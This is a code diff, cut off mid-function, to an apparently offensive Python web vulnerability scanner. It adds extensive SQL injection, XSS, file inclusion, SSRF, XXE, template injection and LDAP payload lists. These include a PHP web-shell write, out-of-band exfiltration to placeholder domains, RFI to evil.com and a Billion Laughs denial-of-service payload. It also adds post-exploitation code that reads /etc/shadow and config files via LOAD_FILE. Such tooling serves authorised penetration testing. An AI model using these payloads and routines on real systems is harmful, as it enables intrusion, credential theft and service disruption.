@@ -18,8 +18,9 @@ import json
 import subprocess
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from requests_html import HTMLSession
-from playwright.sync_api import sync_playwright
+from playwright.async_api import async_playwright
 import html
+import copy # Added for deepcopy
 import configparser
 import google.genai as genai
 import anthropic
@@ -1143,6 +1144,394 @@ COMMON_PARAM_NAMES = [
     'custom_param_1', 'custom_param_2', 'custom_param_3',
 ]
 
+# --- SQL Injection Error Signatures ---
+# A comprehensive list of common database error messages for error-based SQLi detection
+DB_ERRORS = [
+    # MySQL
+    "mysql_fetch_array()", "mysql_num_rows()", "mysql_query()", "supplied argument is not a valid MySQL",
+    "cn_mysqli_query", "cn_mysql_fetch_assoc", "cn_mysql_num_rows", "cn_mysql_result", "cn_mysql_select_db",
+    "cn_mysql_connect", "You have an error in your SQL syntax", "Warning: mysql_", "Expression #",
+    "SQL syntax",
+
+    # PostgreSQL
+    "PostgreSQL query failed", "ERROR: parser: parse error", "Unknown column", "function does not exist",
+    "pg_query()", "pg_exec()", "Warning: pg_", "Npgsql.PostgresException",
+
+    # Oracle
+    "ORA-00900:", "ORA-00921:", "ORA-01000:", "ORA-01777:", "ORA-01460:", "ORA-00933:", "ORA-01722:",
+    "SQL command not properly ended", "quoted string not properly terminated", "invalid column name",
+    "Warning: oci_",
+
+    # Microsoft SQL Server
+    "Unclosed quotation mark", "Microsoft OLE DB Provider for ODBC Drivers error",
+    "Microsoft OLE DB Provider for SQL Server error", "Incorrect syntax near",
+    "SQLSTATE[22003]", "SQLSTATE[22001]", "SQLSTATE[23000]", "SQLSTATE[HY000]",
+    "System.Data.SqlClient.SqlException", "System.Data.OleDb.OleDbException",
+
+    # Generic
+    "SQLSTATE", "Syntax error in query", "supplied argument is not a valid SQL",
+    "query failed", "An unhandled exception occurred", "Invalid SQL statement",
+    "JDBC", "hibernate", "Unable to connect to database", "Fatal error",
+    "exception", "database error", "error in your SQL syntax", "invalid query",
+    "access denied for user", "too many connections", "illegal mix of collations",
+    "unexpected end of statement", "SQLSTATE General Error",
+    "syntax error at or near", "unterminated quoted string", "invalid input syntax for type",
+    "connection refused", "deadlock found", "primary key constraint", "duplicate entry",
+    "could not find driver", "can't connect to local MySQL server", "authentication failed",
+    "unexpected token", "missing operator", "invalid data type", "numeric value out of range",
+    "truncate", "convert", "cast", "type mismatch", "column count doesn't match",
+]
+
+# --- SQL Injection Payloads (Expanded and Enhanced) ---
+SQLI_PAYLOADS_LIST = [
+    # Error-Based SQLi Payloads (Probe-then-Exploit style)
+    # Generic Error-based SQLi (WAF bypass variations)
+    "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT @@version), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", # MySQL (double query)
+    "1' AND EXTRACTVALUE(1,CONCAT(0x5c, (SELECT @@version)))--", # MySQL (XML based)
+    "1' AND 1=CONVERT(INT, (SELECT @@version))--", # MSSQL error
+    "1' AND 1=CAST((SELECT version()) AS INTEGER)--", # PostgreSQL error
+    "1' AND 1=(SELECT TO_NUMBER(user) FROM DUAL)--", # Oracle error
+    "1' AND 1=(SELECT CAST(current_setting('server_version') AS int))--", # PostgreSQL (current_setting)
+    "1' AND (SELECT 1 FROM (SELECT user() FROM DUAL ) x) AS y AND '1'='1",
+    "1' AND (SELECT 1 FROM (SELECT CONCAT_WS(0x3a, (SELECT user()), (SELECT @@hostname), (SELECT @@version)) ) z) AND '1'='1",
+    # Boolean-Based (probes)
+    "1' AND 1=1--", "1' AND 1=2--", "1' OR 1=1--", "1' OR 1=2--",
+    "1' AND 'a'='a",  "1' AND 'a'='b",
+    "1' AND SUBSTR(VERSION(),1,1)='5'--", # Specific info check
+    # Time-Based Blind (MySQL, PostgreSQL, MSSQL, Oracle)
+    "' AND SLEEP(5)--", "'; AND SLEEP(5)--", "') AND SLEEP(5)--",
+    "' AND BENCHMARK(5000000,MD5(1))--",
+    "' OR SLEEP(5)--",
+    "IF(SUBSTR(@@version,1,1)='5',SLEEP(5),0)",
+    "' AND pg_sleep(5)--", "'; AND pg_sleep(5)--",
+    "' WAITFOR DELAY '0:0:5'--", "'; WAITFOR DELAY '0:0:5'--",
+    "' AND DBMS_LOCK.SLEEP(5)--",
+    # UNION-Based (column finding and generic types)
+    "ORDER BY {col_count}--", # Placeholder
+    "UNION SELECT NULL--", "UNION SELECT NULL,NULL--", "UNION SELECT NULL,NULL,NULL--", # Basic probes
+    "UNION SELECT {magic_string},@@version,{fill_nulls}--", # More specific data
+    # WAF Bypasses & Obfuscation
+    "/*!UNION*/SELECT", "UNIO%n/**/SEL%ECT", "%23%0aUNION%23%0bSELECT",
+    "/**/'OR'/**/1=1--", "1' OR 1=1 AND '%'='%'",
+    "1' And 1=1--", # Case obfuscation
+    "1' OR TRUE --",
+    "1' or 0=0--", "1' or 1=0--",
+    "1' and 0=0--", "1' and 1=0--",
+    "1' and (select * from (select sleep(0))a)--", # No-op sleep for baseline
+    # Out-of-Band (OOB) - Placeholder for integration with OOB module, if one exists and can probe for interaction
+    "1' AND LOAD_FILE(CONCAT('\\\\',(SELECT HEX(SUBSTRING(@@version,1,10))),'.{oob_domain}\\test.txt'))--", # MySQL OOB DNS
+    "1' AND master..xp_cmdshell('nslookup (SELECT @@version).{oob_domain}')--", # MSSQL OOB DNS
+    "1' AND UTL_HTTP.REQUEST('http://{oob_domain}/'||(SELECT user FROM DUAL))--", # Oracle OOB HTTP
+    "1' AND (SELECT pg_send_query(pg_connect('host={oob_domain} port=80 dbname=http query=(SELECT version())')) IS NOT NULL)--", # PostgreSQL OOB HTTP (Conceptual)
+    # Advanced WAF Bypasses (more aggressive)
+    "1' AND 1=CONVERT(int, (SELECT @@version_compile_os))--",
+    "1' AND (SELECT ASCII(SUBSTRING((SELECT database()),1,1)))>100--",
+    "1' AND (SELECT count(*) FROM information_schema.tables WHERE table_schema=database() AND SUBSTRING(table_name,1,1) > 'a')--",
+    "1' or '1'='1'#",
+    "1' union select '<?php system($_GET[\"cmd\"]); ?>',null,null into outfile 'shell.php'", # File write (RFI equivalent)
+    "1' AND 1=CAST(char(113)+char(119)+char(98)+char(106)+char(113)+(select user)+char(113)+char(118)+char(122)+char(113)+char(113) as NVARCHAR(4000))--"
+]
+
+# --- XSS Payloads (NEW & EXPANDED) ---
+XSS_PAYLOADS = [
+    # Basic
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    # Event Handlers
+    "<body onload=alert('XSS')>",
+    "<div onmouseover=alert('XSS')>HOVER</div>",
+    # JS URIs
+    "<a href=\"javascript:alert('XSS')\">CLICK</a>",
+    # Encoding & Bypasses
+    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+    "%3cscript%3ealert('XSS')%3c/script%3e",
+    "'\"><svg onload=alert('XSS')>",
+    # Polyglots
+    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/alert(1)//'>",
+    # DOM XSS specific payloads
+    "javascript:alert(document.domain)",
+    "javascript:alert(location.hash)",
+    "javascript:alert(location.href)",
+    "javascript:alert(document.cookie)",
+    "javascript:eval(unescape(location.hash.substr(1)))",
+    "javascript:window.name=location.hash.substr(1);eval(window.name)",
+    "javascript:document.write('<img src=x onerror=alert(1)>')",
+
+    # Mutation XSS (mXSS)
+    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)\">",
+    "<style><img src=\"</style><img src=x onerror=alert(1)\">",
+    "<iframe srcdoc='&lt;img src&equals;x onerror&equals;alert(1)&gt;'></iframe>",
+
+    # More Event Handlers
+    "<body onpageshow=alert(1)>",
+    "<body onresize=alert(1)>",
+    "<div onwheel=alert(1)>SCROLL</div>",
+    "<input onkeyup=alert(1)>",
+    "<input onchange=alert(1)>",
+    "<form onsubmit=alert(1)><input type=submit></form>",
+    "<video src=x onerror=alert(1)>",
+    "<audio src=x onerror=alert(1)>",
+    "<picture><img src=x onerror=alert(1)></picture>",
+    "<details ontoggle=alert(1)><summary>Click</summary></details>",
+    "<image src=x onerror=alert(1)>",
+    "<math><a xlink:href=javascript:alert(1)>click</a></math>",
+    "<animate onbegin=alert(1)>",
+    "<foreignObject><script>alert(1)</script></foreignObject>",
+    "<a onpointerover=alert(1)>Move mouse here</a>",
+    "<div oncontextmenu=alert(1)>Right-click here</div>",
+    "<div oncopy=alert(1)>Copy this text</div>",
+    "<div oncut=alert(1)>Cut this text</div>",
+    "<div onpaste=alert(1)>Paste here</div>",
+    "<input onkeydown=alert(1)>",
+    "<marquee onbounce=alert(1)>bounce</marquee>",
+    "<marquee onfinish=alert(1)>finish</marquee>",
+    "<body onhashchange=alert(1)>",
+    "<body onpagehide=alert(1)>",
+    "<body onstorage=alert(1)>",
+    "<body onunload=alert(1)>",
+    "<svg><g/onload=alert(1)>",
+    "<svg><foreignObject><body/onload=alert(1)>",
+
+    # Encoding & Bypass Variations
+    "&lt;script&gt;alert(1)&lt;/script&gt;",
+    "%3cscript%3ealert(1)%3c/script%3e",
+    "jav&#x09;ascript:alert(1)",
+    "java\0script:alert(1)",
+    "'\"><svg onload=alert(1)>",
+    "<img src=x:x onerror=alert(1)>",
+    "<img src=`x` onerror=alert(1)>",
+    "<img src='/' onerror=alert(1)>",
+    "<script>/* */alert(1)</script>",
+    "<script>eval('ale'+'rt(1)')</script>",
+    "<script>window['a'+'lert'](1)</script>",
+    "<script >alert(1)</script >",
+    "<script\n>alert(1)</script>",
+    "<script\t>alert(1)</script>",
+    "<img src=x onerror\n=\nalert(1)>",
+    "<img src=x onerror\t=\talert(1)>",
+    "<img src=x oNeRrOr=alert(1)>",
+    "<img src=x onerror=alert`1`>",
+    "<img src=x onerror=alert(1)//>",
+    "<img src=x onerror=alert(1)<!--",
+    "&#x61;&#x6c;&#x65;&#x72;&#x74;(1)", # HTML entity encoding
+    "eval(String.fromCharCode(97,108,101,114,116,40,49,41))", # JS char code
+    "javascript:alert&#x28;1&#x29;", # HTML entity for parenthesis
+    "javascript:alert&#40;1&#41;",
+    "javascript:alert%281%29", # URL encoded parenthesis
+    "javascript:alert%0a(1)", # Newline bypass
+    "javascript:alert%0d(1)", # Carriage return bypass
+    "javascript:alert%09(1)", # Tab bypass
+    "javascript:alert%00(1)", # Null byte bypass
+    "javascript:alert(1)//", # Comment bypass
+    "javascript:alert(1)/*", # Multi-line comment bypass
+    "javascript:alert(1)<!--", # HTML comment bypass
+    "javascript:alert(1);", # Semicolon
+    "javascript:alert(1) ", # Trailing space
+    "javascript:alert(1)\t", # Trailing tab
+    "javascript:alert(1)\n", # Trailing newline
+    "javascript:alert(1)\r", # Trailing carriage return
+
+    # Data URIs
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "data:text/html,<script>alert(1)</script>",
+    "data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+
+    # Polyglots (more advanced)
+    "\"'';!--\"<XSS>=&{()}",
+    "<svg onload=alert(1) class=a><script>alert(1)</script>",
+    "<img src=x onerror=alert(1)><script>alert(1)</script>",
+    "<a href=\"javascript:alert(1)\">CLICK</a><script>alert(1)</script>",
+    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/alert(1)//'>",
+    "'\";alert(1);//",
+    "'-alert(1)-'",
+    "\"-alert(1)-\"",
+    "javascript:alert(1)",
+    "{{alert(1)}}", # Template engine XSS
+    "<%= alert(1) %>",
+    "*{{alert(1)}}",
+    "#{alert(1)}",
+    "@{alert(1)}",
+    "[[alert(1)]]",
+    "@(1+1)",
+    "#{process.mainModule.require('child_process').execSync('id')}", # Node.js RCE via XSS
+    "{{''.__class__.__mro__[1].__subclasses__()[_].__init__.__globals__['os'].popen('id').read()}}", # Python RCE via XSS (needs index fuzzing)
+]
+
+# --- LFI/RFI Payloads (NEW & EXPANDED) ---
+LFI_PAYLOADS = [
+    "../../../../etc/passwd",
+    "..\\..\\..\\..\\windows\\win.ini",
+    "php://filter/resource=/etc/passwd",
+    "file:///etc/passwd",
+    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
+    "http://example.com/rfi_test.txt",
+    # Traversal Variations (Increased Depth)
+    *[f"../" * i + "etc/passwd" for i in range(1, 21)],
+    *[f"..\\\\" * i + "windows\\\\win.ini" for i in range(1, 21)],
+    *[f"....//" * i + "etc/passwd" for i in range(1, 21)],
+    *[f"....\\\\" * i + "windows\\\\win.ini" for i in range(1, 21)],
+
+    # Encoding Variations
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
+    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+    "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
+    "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+    "..%c0%5c..%c0%5c..%c0%5c..%c0%5cwindows%c0%5cwin.ini",
+
+    # Null Byte and Path Truncation
+    "../../../../etc/passwd%00",
+    "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini%00",
+    "../../../../etc/passwd%00.jpg",
+    "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini%00.txt",
+    "../../../../etc/passwd%20",
+    "../../../../etc/passwd.",
+    # Path truncation with many dots (simulating max path length)
+    "../../../../etc/passwd" + "." * 250,
+    "../../../../etc/passwd" + "/" * 250, # Directory traversal with many slashes
+
+    # Wrappers
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/convert.iconv.utf-8.utf-7/resource=/etc/passwd",
+    "php://filter/read=string.rot13/resource=/etc/passwd",
+    "php://filter/zlib.decompress/resource=/etc/passwd",
+    "php://filter/string.toupper/resource=/etc/passwd",
+    "php://filter/string.tolower/resource=/etc/passwd",
+    "php://filter/string.strip_tags/resource=index.php",
+    "data://text/plain,<?php phpinfo(); ?>",
+    "php://input", # Requires POST data
+    "expect://id", # If expect module is loaded
+    "phar:///path/to/archive.phar/file.txt", # Placeholder, requires existing phar
+    "zip:///path/to/archive.zip#file.txt", # Placeholder, requires existing zip
+    "php://fd/1", "php://memory", "php://temp",
+    "glob:///etc/passwd",
+
+    # Sensitive Files (Linux)
+    "/etc/shadow", "/etc/group", "/etc/hosts", "/etc/issue", "/etc/motd",
+    "/etc/fstab", "/etc/crontab", "/etc/sysctl.conf", "/etc/resolv.conf",
+    "/etc/profile", "/etc/bashrc",
+    "~/.bash_history", "~/.ssh/id_rsa", "~/.ssh/authorized_keys",
+    "/var/log/auth.log", "/var/log/syslog", "/var/log/dmesg",
+    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
+    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
+    "/var/log/httpd/access_log", "/var/log/httpd/error_log",
+    "/var/log/vsftpd.log", "/var/log/sshd.log", "/var/log/mail.log", "/var/log/cron.log", "/var/log/messages",
+    "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status", "/proc/self/mounts",
+    "/proc/net/arp", "/proc/net/route", "/proc/net/tcp", "/proc/net/udp",
+    "/proc/version", "/proc/cpuinfo", "/proc/meminfo", "/proc/sched_debug",
+    "/etc/ssh/sshd_config", "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
+    "/etc/httpd/conf/httpd.conf", "/etc/lighttpd/lighttpd.conf", "/etc/vsftpd.conf",
+    "/etc/sudoers", "/etc/passwd-", "/etc/shadow-", "/etc/gshadow",
+    "/var/run/dmesg.boot", "/var/log/lastlog", "/var/log/wtmp", "/var/log/btmp",
+    "/var/log/faillog", "/var/log/daemon.log", "/var/log/kern.log",
+    "/opt/lampp/logs/access_log", "/usr/local/apache/logs/access_log",
+    "/usr/local/nginx/logs/access.log", "/usr/local/var/log/nginx/access.log",
+    "~/.bashrc", "~/.profile", "~/.zshrc", "~/.tmux.conf", "~/.vimrc",
+    "/root/.ssh/id_rsa", "/home/user/.ssh/id_rsa", "/root/.bash_history",
+    "/proc/self/attr/current", "/proc/self/cgroup", "/proc/self/comm",
+    "/proc/mounts", "/proc/config.gz", "/proc/kmsg",
+    "/sys/class/dmi/id/product_name", "/sys/firmware/acpi/tables/DSDT",
+
+    # Sensitive Files (Windows)
+    "C:/boot.ini", "C:/autoexec.bat", "C:/config.sys",
+    "C:/Windows/System32/drivers/etc/hosts",
+    "C:/Windows/repair/sam",
+    "C:/Windows/php.ini", "C:/php/php.ini",
+    "C:/xampp/apache/conf/httpd.conf",
+    "C:/Users/Administrator/NTUser.dat",
+    "C:/Windows/System32/LogFiles/W3SVC1/ex000000.log", # IIS logs
+    "C:/Windows/System32/inetsrv/config/applicationHost.config", # IIS config
+    "C:/Program Files/Apache Group/Apache2/conf/httpd.conf",
+    "C:/Program Files/nginx-1.x.x/conf/nginx.conf",
+    "C:/Program Files/php/php.ini",
+    "C:/Users/Public/Desktop/desktop.ini",
+    "C:/inetpub/wwwroot/web.config",
+    "C:/Windows/win.ini.bak", "C:/Windows/system.ini",
+    "C:/Program Files/MySQL/MySQL Server 8.0/my.ini",
+    "C:/Program Files/PostgreSQL/14/data/postgresql.conf",
+    "C:/Windows/Panther/Unattend.xml", # Windows unattended installation files
+
+    # RFI Payloads
+    "http://evil.com/rfi_test.txt",
+    "https://evil.com/rfi_test.txt",
+    "http://google.com",
+    "//google.com",
+    "ftp://evil.com/file.txt",
+    "https://raw.githubusercontent.com/someuser/somerepo/main/shell.txt",
+
+    # More wrapper combinations
+    "php://filter/string.strip_tags|convert.base64-encode/resource=/etc/passwd",
+    "php://filter/zlib.decompress|convert.base64-encode/resource=/var/log/apache2/access.log",
+    "file:///proc/self/fd/0", "file:///proc/self/fd/1", # File descriptors
+    "glob:///*", "glob://*/*", # Glob patterns
+    "php://filter/resource=./index.php", # Current directory
+    "php://filter/resource=../index.php",
+    "php://filter/resource=../../index.php",
+    "php://filter/read=string.strip_tags/resource=php://input",
+    "phar://archive.zip/file.txt",
+    "zip://archive.zip#file.txt",
+    "data:text/plain,<? echo system('id'); ?>",
+    "data:text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJ2lkJyk7ID8+", # base64 encoded `<?php echo system('id'); ?>`
+    "expect://ls", # If expect module is loaded
+
+    # Path manipulation with URL encoding
+    ".%2e/%2e%2e/%2e%2e/etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", # Triple encoding
+    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", # UTF-8 / bypass
+    "..%5c..%5c..%5cwindows%5cwin.ini",
+    "..%255c..%255c..%255cwindows%255cwin.ini", # Double encoded backslash
+
+    # Cloud specific files (conceptual, might need SSRF but also direct LFI if possible)
+    "/var/lib/cloud/instance/user-data.txt", # AWS user-data
+    "/var/lib/cloud/instance/vendordata.txt",
+    "/etc/google/instance", # GCP instance metadata
+    "/var/az_metadata", # Azure metadata
+]
+SENSITIVE_FILES_LFI = [
+    "/etc/passwd", "/etc/shadow", "/etc/hosts",
+    "C:\\windows\\win.ini",
+    "/proc/self/environ",
+    "/var/log/apache2/access.log",
+    "~/.bash_history"
+]
+
+# --- SSRF Payloads (NEW & EXPANDED) ---
+SSRF_PAYLOADS = [
+    "http://127.0.0.1", "http://localhost",
+    "http://169.254.169.254/latest/meta-data/",
+    "file:///etc/passwd",
+    "dict://127.0.0.1:6379/info",
+    "gopher://127.0.0.1:80/_GET%20/admin"
+]
+
+# --- XXE Payloads (NEW & EXPANDED) ---
+XXE_PAYLOADS = {
+    "file_disclosure": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+    "oob_http": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_domain}">]><foo>&xxe;</foo>',
+    "error_based": '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistentfile"> %xxe;]>'
+}
+
+# --- SSTI Payloads (NEW & EXPANDED) ---
+SSTI_PAYLOADS = {
+    "generic": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
+    "jinja2": ["{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"],
+    "freemarker": ["<#assign ex = 'freemarker.template.utility.Execute'?new()>${ex('id')}"],
+    "ruby": ["<%= `id` %>"]
+}
+
+# --- LDAP Payloads & Errors (NEW) ---
+LDAP_PAYLOADS = [
+    "*", ")(cn=*)", "*))%00", "(|(cn=*)(sn=*))",
+]
+LDAP_ERRORS = [
+    "ldap", "invalid filter", "illegal", "protocol error", "ldap exception"
+]
+
+# --- Brute Force Wordlists (NEW & EXPANDED) ---
+BRUTEFORCE_USERNAMES = ['admin', 'administrator', 'root', 'user', 'test', 'guest']
+BRUTEFORCE_PASSWORDS = ['admin', 'password', '123456', 'root', 'test', 'guest']
+
 class OutputHandler:
     def print(self, message):
         raise NotImplementedError
@@ -1172,6 +1561,13 @@ def get_random_string(length=8):
 def sanitize_filename(filename):
     """Removes characters from a string that are not allowed in filenames."""
     return re.sub(r'[^\w\.-]', '_', filename)
+
+def save_output(output_dir, file_name, content):
+    """Saves content to a specified file within the output directory."""
+    file_path = os.path.join(output_dir, file_name)
+    os.makedirs(output_dir, exist_ok=True) # Ensure directory exists
+    with open(file_path, 'w', encoding='utf-8', errors='ignore') as f:
+        f.write(content)
 
 def get_encoded_payloads(payload):
     """다양한 인코딩으로 페이로드 목록 생성"""
@@ -1284,7 +1680,7 @@ async def spider_target(base_url, output, session_cookies=None):
 
     # 1. JS 렌더링을 통한 수집 (Playwright)
     try:
-        with sync_playwright() as p:
+        async with async_playwright() as p:
             browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
             context = await browser.new_context(ignore_https_errors=True)
             if session_cookies:
@@ -3464,7 +3860,8 @@ async def post_exploit_sqli(url, method, param_name, original_value, vuln_payloa
     info_payloads = {
         "Version": "UNION SELECT NULL,@@version,NULL--",
         "Database": "UNION SELECT NULL,database(),NULL--",
-        "User": "UNION SELECT NULL,user(),NULL--"
+        "User": "UNION SELECT NULL,user(),NULL--",
+        "Hostname": "UNION SELECT NULL,@@hostname,NULL--"
     }
     
     extracted_info = {}
@@ -3562,11 +3959,28 @@ async def post_exploit_sqli(url, method, param_name, original_value, vuln_payloa
                                         evidence += f"Leaked Data from '{target_table}.{sensitive_columns[0]}': {dumped_data[:500]}...\n"
                             break # Stop after first successful column enumeration
 
+            # Attempt to read sensitive files using LOAD_FILE (MySQL specific)
+            output.print("    [SQLi] Attempting to read sensitive files using LOAD_FILE...")
+            sensitive_files_to_read = [
+                "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/mysql/my.cnf",
+                "/var/www/html/config.php", # Common web app config
+                "C:\\Windows\\win.ini", "C:\\boot.ini", "C:\\xampp\\apache\\conf\\httpd.conf"
+            ]
+            for file_path in sensitive_files_to_read:
+                load_file_payload = f"UNION SELECT NULL,LOAD_FILE('{file_path}'),NULL--"
+                test_url, test_data = build_request(url, method, param_name, original_value + load_file_payload, form_data, original_query)
+                res_file, _, _ = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+                if res_file and res_file.text and (file_path.split('/')[-1] in await res_file.text() or "root:x:0:0" in await res_file.text() or "[fonts]" in await res_file.text()):
+                    output.print(f"    [CRITICAL] Leaked content of '{file_path}' using LOAD_FILE.")
+                    extracted_info[f"File Content ({file_path})"] = (await res_file.text())[:500]
+                    evidence += f"Leaked File Content from '{file_path}':\n---\n{(await res_file.text())[:500]}...\n---\n"
+
+
     report.add_finding("Error-Based SQL Injection", "Critical", url, param_name, vuln_payload, 
                        "The application returned a database error message, indicating a vulnerability to SQL Injection. Post-exploitation attempts successfully extracted database information.", 
                        "Use parameterized queries or prepared statements for all database interactions. Implement strict input validation and sanitize all user-supplied data. Ensure verbose error messages are disabled in production environments.", 
                        evidence, method=method, request_details=request_details, response_details=response_details,
-                       future_vector="Full database schema and data exfiltration may be possible. Recommend manual testing with sqlmap or similar tools to dump sensitive data.")
+                       future_vector="Full database schema and data exfiltration may be possible. Recommend manual testing with sqlmap or similar tools to dump sensitive data. File writing via 'INTO OUTFILE' might also be possible for RCE.")
     return True
 
 async def check_command_injection(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
@@ -6436,6 +6850,587 @@ async def check_csrf(target, form_to_test, output, tech, report, session_cookies
                 return # Stop after first finding
 
 # =================================================================================
+async def check_xxe(target, form_to_test, output, tech, report, session_cookies=None):
+    output.print(f"\n[+] Starting Ultimate XXE Injection Scan...")
+    
+    random_oob_domain = f"{get_random_string(12)}.example.com"
+    xxe_payloads = {
+        # Classic LFI
+        "file_disclosure_linux": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+        "file_disclosure_windows": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
+        # OOB Interaction
+        "oob_http": f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{random_oob_domain}">]><foo>&xxe;</foo>',
+        "oob_ftp": f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://{random_oob_domain}">]><foo>&xxe;</foo>',
+        # Parameter Entities (Blind XXE)
+        "oob_parameter_entity": f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{random_oob_domain}"> %xxe;]>',
+        "oob_parameter_entity_wrapper": f'<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://{random_oob_domain}/evil.dtd"> %dtd;]>',
+        # Error-based
+        "error_based": '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistentfile"> %xxe;]>',
+        # Billion Laughs (DoS)
+        "billion_laughs": '<!DOCTYPE lol [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">]><lol>&lol5;</lol>',
+        # Wrappers and Bypasses
+        "cdata_wrapper": '<!DOCTYPE foo [<!CDATA[<!ENTITY xxe SYSTEM "file:///etc/passwd">]]><foo>&xxe;</foo>',
+        "utf7_encoded": f'<?xml version="1.0" encoding="UTF-7"?>+ADwAIQ-DOCTYPE foo+AFsAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACIAPgBd+AD4-+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4-',
+    }
+
+    headers = {'Content-Type': 'application/xml'}
+    
+    async def test_xxe(url, method, param_name=None, form_data=None):
+        for name, payload in xxe_payloads.items():
+            data = payload
+            test_url = url
+            
+            if param_name:
+                if method.upper() == 'POST':
+                    post_data = form_data.copy() if form_data else {}
+                    post_data[param_name] = payload
+                    data = post_data
+                else: # GET
+                    test_url = f"{url}?{param_name}={quote(payload)}"
+                    data = None
+            
+            timeout = 10 if "billion_laughs" in name else 5
+            start_time = time.time()
+            res, request_details, response_details = await _send_async_http_request(test_url, method=method.upper(), data=data, headers=headers, timeout=timeout, output=output, session_cookies=session_cookies)
+            duration = time.time() - start_time
+
+            if res and ("root:x:0:0" in await res.text() or "[fonts]" in await res.text()):
+                output.print(f"  [CRITICAL] XXE to LFI confirmed at '{url}' via {method.upper()} param '{param_name or 'XML Body'}'")
+                evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Response Snippet (Leaked File) ---\n{(await res.text())[:400]}\n---"
+                report.add_finding("XML External Entity (XXE) to LFI", "Critical", url, param_name or "XML Body", payload, 
+                                   "The XML parser processes external entities, allowing an attacker to read local files on the server.", 
+                                   "Disable DTDs (Document Type Definitions) and external entity processing in all XML parsers.", evidence, method=method.upper(),
+                                   request_details=request_details, response_details=response_details)
+                return True
+
+            if res and "nonexistentfile" in await res.text() and "error_based" in name:
+                output.print(f"  [HIGH] XXE (Error-Based) confirmed at '{url}' via {method.upper()} param '{param_name or 'XML Body'}'")
+                evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Response Snippet (Error Message) ---\n{(await res.text())[:400]}\n---"
+                report.add_finding("XML External Entity (XXE) - Error Based", "High", url, param_name or "XML Body", payload,
+                                   "The XML parser reveals error messages when processing external entities.",
+                                   "Disable DTDs and external entity processing.", evidence, method=method.upper(),
+                                   request_details=request_details, response_details=response_details)
+                return True
+
+            if duration > 9.5 and "billion_laughs" in name:
+                output.print(f"  [HIGH] XXE (Billion Laughs DoS) confirmed at '{url}' via {method.upper()} param '{param_name or 'XML Body'}'")
+                evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Details ---\nResponse timed out after {duration:.2f} seconds."
+                report.add_finding("XML External Entity (XXE) - Denial of Service", "High", url, param_name or "XML Body", payload,
+                                   "The XML parser is vulnerable to a 'Billion Laughs' attack.",
+                                   "Disable DTDs and implement resource limits on the XML parser.", evidence, method=method.upper(),
+                                   request_details=request_details, response_details=response_details)
+                return True
+
+            if "oob" in name:
+                output.print(f"  [INFO] Sent Blind XXE (OOB) payload to '{url}'. Check collaborator for interaction.")
+                report.add_finding("XML External Entity (XXE) - Blind OOB", "High", url, param_name or "XML Body", payload,
